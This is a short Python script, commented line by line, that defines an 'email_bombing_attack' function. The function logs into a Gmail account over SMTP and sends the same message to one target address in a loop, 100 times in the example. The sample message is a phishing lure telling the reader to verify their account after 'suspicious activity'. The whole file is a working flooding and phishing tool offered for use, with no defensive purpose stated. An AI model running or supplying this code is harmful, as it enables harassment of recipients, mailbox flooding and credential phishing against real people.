import smtplib  # Import the smtplib library to handle sending emails via SMTP
from email.mime.text import MIMEText  # Import MIMEText to create email body in text or HTML format
from email.mime.multipart import MIMEMultipart  # Import MIMEMultipart to handle multiple parts of an email (e.g., body and attachments)

def email_bombing_attack(to_email, from_email, app_password, subject, body, num_emails):
    # Initialize the SMTP server connection to Gmail's SMTP server on port 587
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()  # Upgrade the connection to a secure TLS encrypted connection (Transport Layer Security).
    server.login(from_email, app_password)  # Log in to the sender's Gmail account using the provided app_password

    # Loop to send the specified number of emails
    for i in range(num_emails):
        # Create a MIMEMultipart email object to handle different parts of the email (example: subject, body)
        msg = MIMEMultipart()
        msg['From'] = from_email  # Set the sender's email address
        msg['To'] = to_email  # Set the recipient's email address
        msg['Subject'] = subject  # Set the subject line of the email

        # Format the body of the email as HTML
        html_body = f"<html><body><h2>{body}</h2></body></html>"
        # Attach the HTML body to the email
        msg.attach(MIMEText(html_body, 'html'))

        # Convert the entire email message to a string format
        text = msg.as_string()
        # Send the email using the SMTP server
        server.sendmail(from_email, to_email, text)
        # Print a confirmation message for each email sent
        print(f"Email {i+1} sent successfully!")

    # Close the SMTP server connection after all emails have been sent
    server.quit()

# Example usage:
to_email = "target@example.com"  # Target email address to send the emails to
from_email = "your-email@gmail.com"  # Sender's email address
app_password = "your-app-password"  # Application-specific password for the sender's Gmail account
subject = "Important Notification: Verify Your Account Now"  # Subject line of the email
# Body content of the email (HTML format)
body = """
<html>
<body>
    <h1 style="color: #2d89ef;">Verify Your Account</h1>
    <p>Dear User,</p>
    <p>We noticed suspicious activity in your account and need you to verify your account details to ensure continued access. 
    Please click the link below to confirm your account:</p>
    <p><a href="https://example.com/verify-account" style="color: #1d70b8; text-decoration: none;">Verify My Account</a></p>
    <p>If you did not initiate this request, please contact our support team immediately.</p>
    <p>Thank you,<br>Your Security Team</p>
</body>
</html>
"""
num_emails = 100  # Number of emails to send

# Call the function to start sending emails
email_bombing_attack(to_email, from_email, app_password, subject, body, num_emails)
